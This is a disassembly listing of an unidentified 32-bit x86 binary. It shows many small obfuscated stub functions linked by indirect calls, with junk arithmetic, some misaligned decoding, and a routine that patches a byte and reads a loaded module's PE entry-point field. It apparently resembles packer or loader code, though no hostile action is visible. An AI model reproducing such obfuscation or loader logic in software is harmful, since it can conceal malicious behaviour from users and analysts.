  4d0785:	push   eax
  4d0786:	call   0x4d118c
  4d078b:	add    esp,0x4
  4d078e:	pop    eax
  4d078f:	add    esp,0x50
  4d0792:	pop    ebp
  4d0793:	ret    
  4d0794:	mov    edi,edi
  4d0796:	push   ebp
  4d0797:	mov    ebp,esp
  4d0799:	sub    esp,0x3c
  4d079c:	lea    edx,ds:0x4d31e4
  4d07a2:	xor    ecx,0x65
  4d07a5:	push   edx
  4d07a6:	push   0x0
  4d07a8:	call   0x4d0f5c
  4d07ad:	add    esp,0x4
  4d07b0:	pop    edx
  4d07b1:	push   edx
  4d07b2:	push   DWORD PTR [edx+0x68]
  4d07b5:	push   eax
  4d07b6:	call   0x4d1394
  4d07bb:	add    esp,0x8
  4d07be:	pop    edx
  4d07bf:	mov    eax,0x4d2004
  4d07c4:	mov    eax,DWORD PTR [eax]
  4d07c6:	push   eax
  4d07c7:	push   DWORD PTR [edx-0xd8]
  4d07cd:	pop    eax
  4d07ce:	call   eax
  4d07d0:	add    esp,0x3c
  4d07d3:	pop    ebp
  4d07d4:	ret    
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [edi-0x1],bl
  4d07da:	adc    eax,0x4d2090
  4d07df:	call   edi
  4d07e1:	add    BYTE PTR [eax],al
  4d07e3:	add    BYTE PTR [edi-0x1],bl
  4d07e6:	adc    eax,0x4d2000
  4d07eb:	call   edi
  4d07ed:	add    BYTE PTR [eax],al
  4d07ef:	add    BYTE PTR [edi-0x1],bl
  4d07f2:	adc    eax,0x4d207c
  4d07f7:	call   edi
  4d07f9:	add    BYTE PTR [eax],al
  4d07fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0801:	sub    esp,0x34
  4d0804:	lea    edx,[ebx+0x54]
  4d0807:	xor    ecx,edx
  4d0809:	push   edx
  4d080a:	mov    ebx,0x0
  4d080f:	push   ebx
  4d0810:	call   0x4d0a0c
  4d0815:	add    esp,0x4
  4d0818:	pop    edx
  4d0819:	push   edx
  4d081a:	push   esi
  4d081b:	push   DWORD PTR [edx+0xc8]
  4d0821:	call   0x4d0e38
  4d0826:	add    esp,0x8
  4d0829:	pop    edx
  4d082a:	push   edx
  4d082b:	push   0x0
  4d082d:	call   0x4d0cec
  4d0832:	add    esp,0x4
  4d0835:	pop    edx
  4d0836:	add    esp,0x34
  4d0839:	pop    ebp
  4d083a:	ret    
  4d083b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0841:	sub    esp,0x50
  4d0844:	lea    esi,[edx-0x40]
  4d0847:	and    ecx,DWORD PTR [ebp-0x40]
  4d084a:	mov    eax,0xfffffff4
  4d084f:	push   eax
  4d0850:	call   0x4d0f50
  4d0855:	add    esp,0x4
  4d0858:	push   esi
  4d0859:	push   ebx
  4d085a:	push   eax
  4d085b:	call   0x4d0de4
  4d0860:	add    esp,0x8
  4d0863:	pop    esi
  4d0864:	mov    ecx,0x0
  4d0869:	push   ecx
  4d086a:	call   0x4d07f0
  4d086f:	add    esp,0x4
  4d0872:	add    esp,0x50
  4d0875:	pop    ebp
  4d0876:	ret    
  4d0877:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d087d:	sub    esp,0x44
  4d0880:	mov    esi,0x4d314c
  4d0885:	sub    DWORD PTR [ebp-0x34],ecx
  4d0888:	push   0x0
  4d088a:	call   0x4d072c
  4d088f:	add    esp,0x4
  4d0892:	push   esi
  4d0893:	push   DWORD PTR [esi+0xd8]
  4d0899:	push   DWORD PTR [esi+0x124]
  4d089f:	call   0x4d12fc
  4d08a4:	add    esp,0x8
  4d08a7:	pop    esi
  4d08a8:	mov    edx,0x0
  4d08ad:	push   edx
  4d08ae:	call   0x4d156c
  4d08b3:	add    esp,0x4
  4d08b6:	add    esp,0x44
  4d08b9:	pop    ebp
  4d08ba:	ret    
  4d08bb:	add    BYTE PTR [edi-0x1],bl
  4d08be:	adc    eax,0x4d2024
  4d08c3:	call   edi
  4d08c5:	add    BYTE PTR [eax],al
  4d08c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08cd:	sub    esp,0x44
  4d08d0:	lea    esi,[edi+0x94]
  4d08d6:	adc    DWORD PTR [esi-0x168],0xffffff85
  4d08dd:	push   esi
  4d08de:	push   eax
  4d08df:	push   DWORD PTR [esi+0x150]
  4d08e5:	push   DWORD PTR [esi+0x130]
  4d08eb:	push   DWORD PTR [esi+0x40]
  4d08ee:	call   0x4d0d5c
  4d08f3:	add    esp,0x10
  4d08f6:	pop    esi
  4d08f7:	mov    ebx,0x0
  4d08fc:	push   ebx
  4d08fd:	call   0x4d156c
  4d0902:	add    esp,0x4
  4d0905:	mov    ebx,0x0
  4d090a:	push   ebx
  4d090b:	call   0x4d08bc
  4d0910:	add    esp,0x4
  4d0913:	add    esp,0x44
  4d0916:	pop    ebp
  4d0917:	ret    
  4d0918:	pop    edi
  4d0919:	call   DWORD PTR ds:0x4d2038
  4d091f:	call   edi
  4d0921:	add    BYTE PTR [eax],al
  4d0923:	add    BYTE PTR [edi-0x1],bl
  4d0926:	adc    eax,0x4d2044
  4d092b:	call   edi
  4d092d:	add    BYTE PTR [eax],al
  4d092f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0935:	sub    esp,0x30
  4d0938:	mov    esi,0x4d318c
  4d093d:	add    edi,ebx
  4d093f:	push   esi
  4d0940:	push   DWORD PTR [esi+0xac]
  4d0946:	push   DWORD PTR [esi+0x1d4]
  4d094c:	call   0x4d134c
  4d0951:	add    esp,0x8
  4d0954:	pop    esi
  4d0955:	push   0x0
  4d0957:	call   0x4d147c
  4d095c:	add    esp,0x4
  4d095f:	call   0x4d151c
  4d0964:	add    esp,0x4
  4d0967:	add    esp,0x30
  4d096a:	pop    ebp
  4d096b:	ret    
  4d096c:	mov    edi,edi
  4d096e:	push   ebp
  4d096f:	mov    ebp,esp
  4d0971:	sub    esp,0x50
  4d0974:	lea    esi,ds:0x4d31b0
  4d097a:	adc    edx,DWORD PTR [esi-0x7c]
  4d097d:	push   0x0
  4d097f:	call   0x4d0cec
  4d0984:	add    esp,0x4
  4d0987:	push   esi
  4d0988:	push   ecx
  4d0989:	push   DWORD PTR [esi+0xec]
  4d098f:	push   eax
  4d0990:	push   edi
  4d0991:	call   0x4d0fc4
  4d0996:	add    esp,0x10
  4d0999:	pop    esi
  4d099a:	mov    ebx,0x0
  4d099f:	push   ebx
  4d09a0:	call   0x4d07e4
  4d09a5:	add    esp,0x4
  4d09a8:	add    esp,0x50
  4d09ab:	pop    ebp
  4d09ac:	ret    
  4d09ad:	add    BYTE PTR [eax],al
  4d09af:	add    BYTE PTR [edi-0x1],bl
  4d09b2:	adc    eax,0x4d2068
  4d09b7:	call   edi
  4d09b9:	add    BYTE PTR [eax],al
  4d09bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09c1:	sub    esp,0x2c
  4d09c4:	lea    edi,[ebx-0xd0]
  4d09ca:	add    esi,DWORD PTR [edi-0xac]
  4d09d0:	push   edi
  4d09d1:	push   DWORD PTR [edi+0xd4]
  4d09d7:	push   DWORD PTR [edi+0xf8]
  4d09dd:	push   DWORD PTR [edi+0xb4]
  4d09e3:	push   esi
  4d09e4:	call   0x4d1528
  4d09e9:	add    esp,0x10
  4d09ec:	pop    edi
  4d09ed:	push   edi
  4d09ee:	mov    esi,0x0
  4d09f3:	push   esi
  4d09f4:	call   0x4d08bc
  4d09f9:	add    esp,0x4
  4d09fc:	pop    edi
  4d09fd:	push   edi
  4d09fe:	call   0x4d151c
  4d0a03:	add    esp,0x4
  4d0a06:	pop    edi
  4d0a07:	add    esp,0x2c
  4d0a0a:	pop    ebp
  4d0a0b:	ret    
  4d0a0c:	pop    edi
  4d0a0d:	call   DWORD PTR ds:0x4d2008
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a1d:	sub    esp,0x24
  4d0a20:	lea    ecx,ds:0x4d31cc
  4d0a26:	or     DWORD PTR [ecx-0x88],0x132d
  4d0a30:	push   ecx
  4d0a31:	push   eax
  4d0a32:	push   DWORD PTR [ecx+0x6c]
  4d0a35:	push   DWORD PTR [ecx+0xb8]
  4d0a3b:	call   0x4d0ebc
  4d0a40:	add    esp,0xc
  4d0a43:	pop    ecx
  4d0a44:	push   ecx
  4d0a45:	call   0x4d118c
  4d0a4a:	add    esp,0x4
  4d0a4d:	pop    ecx
  4d0a4e:	push   ecx
  4d0a4f:	mov    ecx,0x0
  4d0a54:	push   ecx
  4d0a55:	call   0x4d08bc
  4d0a5a:	add    esp,0x4
  4d0a5d:	pop    ecx
  4d0a5e:	add    esp,0x24
  4d0a61:	pop    ebp
  4d0a62:	ret    
  4d0a63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a69:	sub    esp,0x1c
  4d0a6c:	lea    edx,ds:0x4d3164
  4d0a72:	and    ecx,0xffffffca
  4d0a75:	push   edx
  4d0a76:	push   DWORD PTR [edx+0x18c]
  4d0a7c:	push   edi
  4d0a7d:	call   0x4d083c
  4d0a82:	add    esp,0x8
  4d0a85:	pop    edx
  4d0a86:	push   edx
  4d0a87:	call   0x4d151c
  4d0a8c:	add    esp,0x4
  4d0a8f:	pop    edx
  4d0a90:	push   edx
  4d0a91:	push   0x0
  4d0a93:	call   0x4d0f5c
  4d0a98:	add    esp,0x4
  4d0a9b:	pop    edx
  4d0a9c:	add    esp,0x1c
  4d0a9f:	pop    ebp
  4d0aa0:	ret    
  4d0aa1:	add    BYTE PTR [eax],al
  4d0aa3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa9:	sub    esp,0x3c
  4d0aac:	mov    eax,0x4d3048
  4d0ab1:	adc    ebx,0xffffdd17
  4d0ab7:	push   eax
  4d0ab8:	push   ecx
  4d0ab9:	push   DWORD PTR [eax+0xac]
  4d0abf:	push   edx
  4d0ac0:	call   0x4d1060
  4d0ac5:	add    esp,0xc
  4d0ac8:	pop    eax
  4d0ac9:	push   eax
  4d0aca:	push   0x0
  4d0acc:	call   0x4d07e4
  4d0ad1:	add    esp,0x4
  4d0ad4:	pop    eax
  4d0ad5:	push   eax
  4d0ad6:	lea    esi,[eax-0x48]
  4d0ad9:	push   esi
  4d0ada:	call   0x4d0d50
  4d0adf:	add    esp,0x4
  4d0ae2:	test   eax,eax
  4d0ae4:	jne    0x4d0ad6
  4d0ae6:	pop    eax
  4d0ae7:	add    esp,0x3c
  4d0aea:	pop    ebp
  4d0aeb:	ret    
  4d0aec:	pop    edi
  4d0aed:	call   DWORD PTR ds:0x4d206c
  4d0af3:	call   edi
  4d0af5:	add    BYTE PTR [eax],al
  4d0af7:	add    BYTE PTR [edi-0x1],bl
  4d0afa:	adc    eax,0x4d2080
  4d0aff:	call   edi
  4d0b01:	add    BYTE PTR [eax],al
  4d0b03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b09:	sub    esp,0x4c
  4d0b0c:	lea    ebx,ds:0x4d3010
  4d0b12:	cmp    ebx,0x1ccb
  4d0b18:	je     0x4d0b07
  4d0b1a:	mov    ecx,0x0
  4d0b1f:	push   ecx
  4d0b20:	call   0x4d147c
  4d0b25:	add    esp,0x4
  4d0b28:	push   ebx
  4d0b29:	push   edx
  4d0b2a:	push   DWORD PTR [ebx+0x1e4]
  4d0b30:	push   DWORD PTR [ebx+0x148]
  4d0b36:	push   edi
  4d0b37:	call   0x4d06ec
  4d0b3c:	add    esp,0x10
  4d0b3f:	pop    ebx
  4d0b40:	mov    edx,0x0
  4d0b45:	push   edx
  4d0b46:	call   0x4d0f5c
  4d0b4b:	add    esp,0x4
  4d0b4e:	add    esp,0x4c
  4d0b51:	pop    ebp
  4d0b52:	ret    
  4d0b53:	add    BYTE PTR [edi-0x1],bl
  4d0b56:	adc    eax,0x4d2070
  4d0b5b:	call   edi
  4d0b5d:	add    BYTE PTR [eax],al
  4d0b5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b65:	sub    esp,0x48
  4d0b68:	lea    ecx,[esi+0x68]
  4d0b6b:	and    edx,0x3884
  4d0b71:	push   ecx
  4d0b72:	push   edi
  4d0b73:	push   edi
  4d0b74:	push   edx
  4d0b75:	push   DWORD PTR [ecx+0x180]
  4d0b7b:	call   0x4d12a0
  4d0b80:	add    esp,0x10
  4d0b83:	pop    ecx
  4d0b84:	push   ecx
  4d0b85:	mov    esi,0x0
  4d0b8a:	push   esi
  4d0b8b:	call   0x4d156c
  4d0b90:	add    esp,0x4
  4d0b93:	pop    ecx
  4d0b94:	push   ecx
  4d0b95:	lea    ecx,[ecx-0x16c]
  4d0b9b:	push   ecx
  4d0b9c:	call   0x4d0d50
  4d0ba1:	add    esp,0x4
  4d0ba4:	test   eax,eax
  4d0ba6:	jne    0x4d0b95
  4d0ba8:	pop    ecx
  4d0ba9:	add    esp,0x48
  4d0bac:	pop    ebp
  4d0bad:	ret    
  4d0bae:	add    BYTE PTR [eax],al
  4d0bb0:	pop    edi
  4d0bb1:	call   DWORD PTR ds:0x4d2020
  4d0bb7:	call   edi
  4d0bb9:	add    BYTE PTR [eax],al
  4d0bbb:	add    BYTE PTR [edi+0x2b],dl
  4d0bbe:	call   DWORD PTR [edi+0x57]
  4d0bc1:	push   edi
  4d0bc2:	push   edi
  4d0bc3:	call   0x4d151c
  4d0bc8:	sub    esp,0xfffffffc
  4d0bcb:	call   0x4d1254
  4d0bd0:	push   0x2
  4d0bd2:	xor    eax,eax
  4d0bd4:	sub    eax,0x4d3030
  4d0bd9:	neg    eax
  4d0bdb:	push   0x0
  4d0bdd:	lea    ecx,[eax+0x6]
  4d0be0:	add    BYTE PTR [ecx],0x41
  4d0be3:	push   eax
  4d0be4:	call   0x4d0e2c
  4d0be9:	pop    edi
  4d0bea:	pop    edi
  4d0beb:	pop    edi
  4d0bec:	lea    ecx,[eax+0x3b]
  4d0bef:	mov    edi,DWORD PTR [ecx]
  4d0bf1:	lea    eax,[eax+edi*1]
  4d0bf4:	mov    eax,DWORD PTR [eax+0x28]
  4d0bf7:	pusha  
  4d0bf8:	mov    ah,0x45
  4d0bfa:	sub    al,ah
  4d0bfc:	ja     0x4d0794
  4d0c02:	popa   
  4d0c03:	ret    
  4d0c04:	mov    edi,edi
  4d0c06:	push   ebp
  4d0c07:	mov    ebp,esp
  4d0c09:	sub    esp,0x60
  4d0c0c:	lea    ecx,ds:0x4d31dc
  4d0c12:	and    edi,DWORD PTR [ecx-0x6c]
  4d0c15:	push   ecx
  4d0c16:	mov    eax,0x0
  4d0c1b:	push   eax
  4d0c1c:	call   0x4d0f5c
  4d0c21:	add    esp,0x4
  4d0c24:	pop    ecx
  4d0c25:	push   ecx
  4d0c26:	push   edx
  4d0c27:	push   DWORD PTR [ecx+0x154]
  4d0c2d:	call   0x4d0d04
  4d0c32:	add    esp,0x8
  4d0c35:	pop    ecx
  4d0c36:	push   ecx
  4d0c37:	mov    esi,0x0
  4d0c3c:	push   esi
  4d0c3d:	call   0x4d0a0c
  4d0c42:	add    esp,0x4
  4d0c45:	pop    ecx
  4d0c46:	add    esp,0x60
  4d0c49:	pop    ebp
  4d0c4a:	ret    
  4d0c4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c51:	sub    esp,0x48
  4d0c54:	lea    edx,ds:0x4d3124
  4d0c5a:	and    ecx,0x47
  4d0c5d:	push   edx
  4d0c5e:	mov    edi,0x0
  4d0c63:	push   edi
  4d0c64:	call   0x4d0a0c
  4d0c69:	add    esp,0x4
  4d0c6c:	pop    edx
  4d0c6d:	push   edx
  4d0c6e:	push   eax
  4d0c6f:	push   DWORD PTR [edx+0xbc]
  4d0c75:	push   edi
  4d0c76:	push   ecx
  4d0c77:	call   0x4d1578
  4d0c7c:	add    esp,0x10
  4d0c7f:	pop    edx
  4d0c80:	push   edx
  4d0c81:	push   0x0
  4d0c83:	call   0x4d147c
  4d0c88:	add    esp,0x4
  4d0c8b:	pop    edx
  4d0c8c:	add    esp,0x48
  4d0c8f:	pop    ebp
  4d0c90:	ret    
  4d0c91:	add    BYTE PTR [eax],al
  4d0c93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c99:	sub    esp,0x48
  4d0c9c:	lea    edi,[ecx-0x19c]
  4d0ca2:	and    DWORD PTR [ebp-0x24],0xffffff92
  4d0ca6:	push   edi
  4d0ca7:	push   DWORD PTR [edi+0x134]
  4d0cad:	push   DWORD PTR [edi+0x1c4]
  4d0cb3:	call   0x4d0aa4
  4d0cb8:	add    esp,0x8
  4d0cbb:	pop    edi
  4d0cbc:	push   edi
  4d0cbd:	mov    esi,0x0
  4d0cc2:	push   esi
  4d0cc3:	call   0x4d0a0c
  4d0cc8:	add    esp,0x4
  4d0ccb:	pop    edi
  4d0ccc:	push   edi
  4d0ccd:	push   0xfffffff4
  4d0ccf:	call   0x4d0f50
  4d0cd4:	add    esp,0x4
  4d0cd7:	pop    edi
  4d0cd8:	add    esp,0x48
  4d0cdb:	pop    ebp
  4d0cdc:	ret    
  4d0cdd:	add    BYTE PTR [eax],al
  4d0cdf:	add    BYTE PTR [edi-0x1],bl
  4d0ce2:	adc    eax,0x4d2064
  4d0ce7:	call   edi
  4d0ce9:	add    BYTE PTR [eax],al
  4d0ceb:	add    BYTE PTR [edi-0x1],bl
  4d0cee:	adc    eax,0x4d2048
  4d0cf3:	call   edi
  4d0cf5:	add    BYTE PTR [eax],al
  4d0cf7:	add    BYTE PTR [edi-0x1],bl
  4d0cfa:	adc    eax,0x4d209c
  4d0cff:	call   edi
  4d0d01:	add    BYTE PTR [eax],al
  4d0d03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d09:	sub    esp,0x20
  4d0d0c:	lea    eax,[ecx-0x44]
  4d0d0f:	cmp    eax,0x284d
  4d0d14:	jb     0x4d0d07
  4d0d16:	push   eax
  4d0d17:	push   ebx
  4d0d18:	push   ecx
  4d0d19:	push   DWORD PTR [eax+0xec]
  4d0d1f:	call   0x4d1260
  4d0d24:	add    esp,0xc
  4d0d27:	pop    eax
  4d0d28:	push   eax
  4d0d29:	call   0x4d151c
  4d0d2e:	add    esp,0x4
  4d0d31:	pop    eax
  4d0d32:	push   eax
  4d0d33:	call   0x4d151c
  4d0d38:	add    esp,0x4
  4d0d3b:	pop    eax
  4d0d3c:	add    esp,0x20
  4d0d3f:	pop    ebp
  4d0d40:	ret    
  4d0d41:	add    BYTE PTR [eax],al
  4d0d43:	add    BYTE PTR [edi-0x1],bl
  4d0d46:	adc    eax,0x4d2060
  4d0d4b:	call   edi
  4d0d4d:	add    BYTE PTR [eax],al
  4d0d4f:	add    BYTE PTR [edi-0x1],bl
  4d0d52:	adc    eax,0x4d2004
  4d0d57:	call   edi
  4d0d59:	add    BYTE PTR [eax],al
  4d0d5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d61:	sub    esp,0x20
  4d0d64:	lea    ecx,[esi+0x54]
  4d0d67:	add    esi,DWORD PTR [ecx-0x104]
  4d0d6d:	push   ecx
  4d0d6e:	push   0x0
  4d0d70:	call   0x4d0f5c
  4d0d75:	add    esp,0x4
  4d0d78:	pop    ecx
  4d0d79:	push   ecx
  4d0d7a:	push   DWORD PTR [ecx+0x3c]
  4d0d7d:	push   esi
  4d0d7e:	push   DWORD PTR [ecx+0xd0]
  4d0d84:	push   esi
  4d0d85:	call   0x4d0c94
  4d0d8a:	add    esp,0x10
  4d0d8d:	pop    ecx
  4d0d8e:	push   ecx
  4d0d8f:	push   0x0
  4d0d91:	call   0x4d08bc
  4d0d96:	add    esp,0x4
  4d0d99:	pop    ecx
  4d0d9a:	add    esp,0x20
  4d0d9d:	pop    ebp
  4d0d9e:	ret    
  4d0d9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0da5:	sub    esp,0x40
  4d0da8:	lea    ebx,[edx-0xf4]
  4d0dae:	and    DWORD PTR [ebp-0x8],0x660c
  4d0db5:	push   ebx
  4d0db6:	push   DWORD PTR [ebx+0xe4]
  4d0dbc:	push   esi
  4d0dbd:	call   0x4d1018
  4d0dc2:	add    esp,0x8
  4d0dc5:	pop    ebx
  4d0dc6:	push   0x0
  4d0dc8:	call   0x4d0cec
  4d0dcd:	add    esp,0x4
  4d0dd0:	mov    ecx,0x0
  4d0dd5:	push   ecx
  4d0dd6:	call   0x4d07e4
  4d0ddb:	add    esp,0x4
  4d0dde:	add    esp,0x40
  4d0de1:	pop    ebp
  4d0de2:	ret    
  4d0de3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0de9:	sub    esp,0x60
  4d0dec:	lea    ecx,ds:0x4d31fc
  4d0df2:	sub    ebx,DWORD PTR [ebp-0x40]
  4d0df5:	push   ecx
  4d0df6:	mov    ecx,0x0
  4d0dfb:	push   ecx
  4d0dfc:	call   0x4d0f5c
  4d0e01:	add    esp,0x4
  4d0e04:	pop    ecx
  4d0e05:	push   ecx
  4d0e06:	push   ebx
  4d0e07:	push   DWORD PTR [ecx+0x160]
  4d0e0d:	push   eax
  4d0e0e:	push   esi
  4d0e0f:	call   0x4d11a4
  4d0e14:	add    esp,0x10
  4d0e17:	pop    ecx
  4d0e18:	push   ecx
  4d0e19:	push   0x0
  4d0e1b:	call   0x4d156c
  4d0e20:	add    esp,0x4
  4d0e23:	pop    ecx
  4d0e24:	add    esp,0x60
  4d0e27:	pop    ebp
  4d0e28:	ret    
  4d0e29:	add    BYTE PTR [eax],al
  4d0e2b:	add    BYTE PTR [edi-0x1],bl
  4d0e2e:	adc    eax,0x4d201c
  4d0e33:	call   edi
  4d0e35:	add    BYTE PTR [eax],al
  4d0e37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e3d:	sub    esp,0x28
  4d0e40:	mov    edi,0x4d31c0
  4d0e45:	or     DWORD PTR [edi-0xd4],edi
  4d0e4b:	push   edi
  4d0e4c:	push   DWORD PTR [edi+0xf8]
  4d0e52:	push   edx
  4d0e53:	call   0x4d10b8
  4d0e58:	add    esp,0x8
  4d0e5b:	pop    edi
  4d0e5c:	push   edi
  4d0e5d:	call   0x4d0744
  4d0e62:	add    esp,0x4
  4d0e65:	pop    edi
  4d0e66:	push   edi
  4d0e67:	mov    eax,0x0
  4d0e6c:	push   eax
  4d0e6d:	call   0x4d0af8
  4d0e72:	add    esp,0x4
  4d0e75:	pop    edi
  4d0e76:	add    esp,0x28
  4d0e79:	pop    ebp
  4d0e7a:	ret    
  4d0e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e81:	sub    esp,0x20
  4d0e84:	mov    ebx,0x4d31ac
  4d0e89:	adc    DWORD PTR [ebx-0x78],ebx
  4d0e8c:	push   ebx
  4d0e8d:	push   DWORD PTR [ebx+0x18]
  4d0e90:	push   edi
  4d0e91:	push   edi
  4d0e92:	push   DWORD PTR [ebx+0x48]
  4d0e95:	call   0x4d0c04
  4d0e9a:	add    esp,0x10
  4d0e9d:	pop    ebx
  4d0e9e:	push   0x0
  4d0ea0:	call   0x4d0f5c
  4d0ea5:	add    esp,0x4
  4d0ea8:	mov    esi,0xfffffff4
  4d0ead:	push   esi
  4d0eae:	call   0x4d0f50
  4d0eb3:	add    esp,0x4
  4d0eb6:	add    esp,0x20
  4d0eb9:	pop    ebp
  4d0eba:	ret    
  4d0ebb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ec1:	sub    esp,0x20
  4d0ec4:	mov    eax,0x4d3070
  4d0ec9:	sbb    ecx,edx
  4d0ecb:	push   eax
  4d0ecc:	mov    eax,0x0
  4d0ed1:	push   eax
  4d0ed2:	call   0x4d156c
  4d0ed7:	add    esp,0x4
  4d0eda:	pop    eax
  4d0edb:	push   eax
  4d0edc:	push   DWORD PTR [eax+0x190]
  4d0ee2:	push   DWORD PTR [eax+0x54]
  4d0ee5:	call   0x4d1104
  4d0eea:	add    esp,0x8
  4d0eed:	pop    eax
  4d0eee:	push   eax
  4d0eef:	mov    ebx,0x0
  4d0ef4:	push   ebx
  4d0ef5:	call   0x4d147c
  4d0efa:	add    esp,0x4
  4d0efd:	pop    eax
  4d0efe:	add    esp,0x20
  4d0f01:	pop    ebp
  4d0f02:	ret    
  4d0f03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f09:	sub    esp,0x3c
  4d0f0c:	lea    ebx,[eax+0xfc]
  4d0f12:	sbb    DWORD PTR [ebx-0x30],0xffff88cf
  4d0f19:	push   0x0
  4d0f1b:	call   0x4d0cec
  4d0f20:	add    esp,0x4
  4d0f23:	push   ebx
  4d0f24:	push   DWORD PTR [ebx+0x104]
  4d0f2a:	push   DWORD PTR [ebx+0x1d4]
  4d0f30:	push   DWORD PTR [ebx+0x4c]
  4d0f33:	call   0x4d096c
  4d0f38:	add    esp,0xc
  4d0f3b:	pop    ebx
  4d0f3c:	mov    eax,0x0
  4d0f41:	push   eax
  4d0f42:	call   0x4d072c
  4d0f47:	add    esp,0x4
  4d0f4a:	add    esp,0x3c
  4d0f4d:	pop    ebp
  4d0f4e:	ret    
  4d0f4f:	add    BYTE PTR [edi-0x1],bl
  4d0f52:	adc    eax,0x4d202c
  4d0f57:	call   edi
  4d0f59:	add    BYTE PTR [eax],al
  4d0f5b:	add    BYTE PTR [edi-0x1],bl
  4d0f5e:	adc    eax,0x4d2074
  4d0f63:	call   edi
  4d0f65:	add    BYTE PTR [eax],al
  4d0f67:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f6d:	sub    esp,0x2c
  4d0f70:	lea    esi,ds:0x4d3188
  4d0f76:	mov    DWORD PTR [esi-0x148],ebx
  4d0f7c:	push   esi
  4d0f7d:	push   DWORD PTR [esi+0xf4]
  4d0f83:	push   eax
  4d0f84:	push   edx
  4d0f85:	call   0x4d14d4
  4d0f8a:	add    esp,0xc
  4d0f8d:	pop    esi
  4d0f8e:	mov    ebx,0x0
  4d0f93:	push   ebx
  4d0f94:	call   0x4d07e4
  4d0f99:	add    esp,0x4
  4d0f9c:	call   0x4d151c
  4d0fa1:	add    esp,0x4
  4d0fa4:	add    esp,0x2c
  4d0fa7:	pop    ebp
  4d0fa8:	ret    
  4d0fa9:	add    BYTE PTR [eax],al
  4d0fab:	add    BYTE PTR [edi-0x1],bl
  4d0fae:	adc    eax,0x4d200c
  4d0fb3:	call   edi
  4d0fb5:	add    BYTE PTR [eax],al
  4d0fb7:	add    BYTE PTR [edi-0x1],bl
  4d0fba:	adc    eax,0x4d2098
  4d0fbf:	call   edi
  4d0fc1:	add    BYTE PTR [eax],al
  4d0fc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc9:	sub    esp,0x40
  4d0fcc:	mov    ebx,0x4d316c
  4d0fd1:	cmp    ebx,0x18ad
  4d0fd7:	jbe    0x4d0fc7
  4d0fd9:	mov    edx,0x0
  4d0fde:	push   edx
  4d0fdf:	call   0x4d0af8
  4d0fe4:	add    esp,0x4
  4d0fe7:	push   ebx
  4d0fe8:	push   edx
  4d0fe9:	push   DWORD PTR [ebx+0x154]
  4d0fef:	call   0x4d0750
  4d0ff4:	add    esp,0x8
  4d0ff7:	pop    ebx
  4d0ff8:	mov    esi,0x0
  4d0ffd:	push   esi
  4d0ffe:	call   0x4d08bc
  4d1003:	add    esp,0x4
  4d1006:	add    esp,0x40
  4d1009:	pop    ebp
  4d100a:	ret    
  4d100b:	add    BYTE PTR [edi-0x1],bl
  4d100e:	adc    eax,0x4d2058
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d101d:	sub    esp,0x3c
  4d1020:	lea    edi,[ebx+0x1ac]
  4d1026:	and    DWORD PTR [edi-0xf0],edi
  4d102c:	push   edi
  4d102d:	push   DWORD PTR [edi+0xf8]
  4d1033:	push   DWORD PTR [edi+0x50]
  4d1036:	call   0x4d0e7c
  4d103b:	add    esp,0x8
  4d103e:	pop    edi
  4d103f:	push   edi
  4d1040:	call   0x4d0744
  4d1045:	add    esp,0x4
  4d1048:	pop    edi
  4d1049:	push   edi
  4d104a:	mov    edx,0x0
  4d104f:	push   edx
  4d1050:	call   0x4d0a0c
  4d1055:	add    esp,0x4
  4d1058:	pop    edi
  4d1059:	add    esp,0x3c
  4d105c:	pop    ebp
  4d105d:	ret    
  4d105e:	add    BYTE PTR [eax],al
  4d1060:	mov    edi,edi
  4d1062:	push   ebp
  4d1063:	mov    ebp,esp
  4d1065:	sub    esp,0x48
  4d1068:	mov    ebx,0x4d3128
  4d106d:	sub    esi,DWORD PTR [ebx-0xac]
  4d1073:	mov    eax,0x0
  4d1078:	push   eax
  4d1079:	call   0x4d07e4
  4d107e:	add    esp,0x4
  4d1081:	push   ebx
  4d1082:	push   esi
  4d1083:	push   DWORD PTR [ebx+0x16c]
  4d1089:	call   0x4d0878
  4d108e:	add    esp,0x8
  4d1091:	pop    ebx
  4d1092:	call   0x4d0744
  4d1097:	add    esp,0x4
  4d109a:	add    esp,0x48
  4d109d:	pop    ebp
  4d109e:	ret    
  4d109f:	add    BYTE PTR [edi-0x1],bl
  4d10a2:	adc    eax,0x4d205c
  4d10a7:	call   edi
  4d10a9:	add    BYTE PTR [eax],al
  4d10ab:	add    BYTE PTR [edi-0x1],bl
  4d10ae:	adc    eax,0x4d20a0
  4d10b3:	call   edi
  4d10b5:	add    BYTE PTR [eax],al
  4d10b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10bd:	sub    esp,0x30
  4d10c0:	mov    ecx,0x4d308c
  4d10c5:	cmp    ecx,0x4789
  4d10cb:	jbe    0x4d10bb
  4d10cd:	push   ecx
  4d10ce:	push   DWORD PTR [ecx+0x20]
  4d10d1:	push   DWORD PTR [ecx+0xac]
  4d10d7:	call   0x4d13ec
  4d10dc:	add    esp,0x8
